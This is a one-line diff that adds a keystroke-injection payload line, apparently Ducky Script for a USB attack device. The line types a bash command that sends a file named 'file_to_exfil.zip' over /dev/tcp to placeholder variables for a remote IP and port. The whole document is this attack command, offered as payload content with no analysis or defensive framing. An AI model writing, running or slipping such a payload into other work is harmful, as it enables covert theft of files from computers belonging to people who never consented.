@@ -1,0 +1,1 @@
+STRINGLN bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/![$DS_IP]/![$DS_PORT]'
